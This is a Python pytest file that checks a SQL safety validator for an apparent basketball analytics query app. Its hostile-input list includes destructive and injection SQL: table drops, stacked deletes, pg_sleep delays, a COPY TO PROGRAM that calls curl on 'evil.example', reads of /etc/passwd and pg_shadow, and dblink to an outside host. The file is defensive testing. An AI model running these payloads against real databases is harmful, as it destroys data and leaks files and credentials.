"""SQL validation: hostile inputs are rejected, real analytic queries pass."""

from __future__ import annotations

import psycopg
import pytest

from core.fewshot import load_pool
from core.safety import UnsafeSQLError, validate
from core.schema import introspect

READONLY_URL = "postgresql://hoopql_readonly:hoopql_readonly@localhost:5432/hoopql"


@pytest.fixture(scope="module")
def schema():
    with psycopg.connect(READONLY_URL) as conn:
        return introspect(conn)


HOSTILE = {
    "drop_table": "DROP TABLE player",
    "stacked_delete": "SELECT * FROM team; DELETE FROM team",
    "stacked_after_comment": "SELECT 1 --\n; DROP TABLE team",
    "block_comment": "SELECT * FROM team /* ; DELETE FROM team */",
    "pg_sleep": "SELECT pg_sleep(30)",
    "pg_sleep_in_where": "SELECT * FROM team WHERE pg_sleep(30) IS NULL",
    "cte_delete": "WITH gone AS (DELETE FROM team RETURNING *) SELECT * FROM gone",
    "cte_update": "WITH x AS (UPDATE player SET full_name = 'x' RETURNING *) SELECT count(*) FROM x",
    "copy_to_program": "COPY team TO PROGRAM 'curl http://evil.example'",
    "read_file": "SELECT pg_read_file('/etc/passwd')",
    "dblink": "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)",
    "select_into": "SELECT * INTO stolen FROM player",
    "catalog_table": "SELECT usename, passwd FROM pg_catalog.pg_shadow",
    "unknown_column": "SELECT salary FROM player",
    "hidden_table": "SELECT * FROM etl_run",
}


@pytest.mark.parametrize("sql", HOSTILE.values(), ids=HOSTILE.keys())
def test_hostile_input_is_rejected(schema, sql: str) -> None:
    with pytest.raises(UnsafeSQLError):
        validate(sql, schema)


VALID = {
    "count": "SELECT COUNT(*) FROM team",
    "aggregate_join": (
        "SELECT p.full_name, ROUND(AVG(l.pts), 1) AS ppg FROM player_game_log l "
        "JOIN player p ON p.player_id = l.player_id WHERE l.season = '2024-25' "
        "GROUP BY p.full_name ORDER BY ppg DESC LIMIT 10"
    ),
    "using_join": "SELECT p.full_name, SUM(l.fg3m) FROM player_game_log l JOIN player p USING (player_id) GROUP BY 1",
    "cte": (
        "WITH totals AS (SELECT team_id, SUM(pts) AS points FROM team_game_log GROUP BY team_id) "
        "SELECT t.full_name, totals.points FROM totals JOIN team t ON t.team_id = totals.team_id"
    ),
    "subquery_alias": "SELECT s.ppg FROM (SELECT AVG(pts) AS ppg FROM player_game_log) s",
    "window": (
        "SELECT player_id, game_date, pts, RANK() OVER (PARTITION BY season ORDER BY pts DESC) AS rnk "
        "FROM player_game_log WHERE season = '2023-24'"
    ),
    "union": "SELECT home_team_id AS team_id FROM game UNION SELECT away_team_id FROM game",
    "case_and_dates": (
        "SELECT CASE WHEN is_home THEN 'home' ELSE 'away' END AS venue, date_trunc('month', game_date) AS m, "
        "COUNT(*) FROM team_game_log GROUP BY 1, 2"
    ),
    "string_with_dashes": "SELECT full_name FROM player WHERE full_name LIKE '%--%'",
    "exists": (
        "SELECT t.abbreviation FROM team t WHERE EXISTS "
        "(SELECT 1 FROM game g WHERE g.home_team_id = t.team_id AND g.home_score > 150)"
    ),
}


@pytest.mark.parametrize("sql", VALID.values(), ids=VALID.keys())
def test_valid_query_passes_and_executes(schema, sql: str) -> None:
    result = validate(sql, schema)
    with psycopg.connect(READONLY_URL) as conn:
        conn.execute(result.sql).fetchall()


def test_limit_is_appended_only_when_missing(schema) -> None:
    added = validate("SELECT full_name FROM team", schema, row_limit=50)
    assert added.limit_added
    assert added.sql.endswith("LIMIT 50")
    kept = validate("SELECT full_name FROM team LIMIT 5", schema, row_limit=50)
    assert not kept.limit_added
    assert kept.sql.endswith("LIMIT 5")


def test_trailing_semicolon_is_fine(schema) -> None:
    assert validate("SELECT COUNT(*) FROM team;", schema).tables == ("team",)


def test_error_names_the_problem(schema) -> None:
    with pytest.raises(UnsafeSQLError, match=r"player\.salary"):
        validate("SELECT p.salary FROM player p", schema)


def test_every_fewshot_example_passes(schema) -> None:
    failures = {}
    for example in load_pool():
        try:
            validate(example.sql, schema)
        except UnsafeSQLError as exc:
            failures[example.id] = str(exc)
    assert not failures
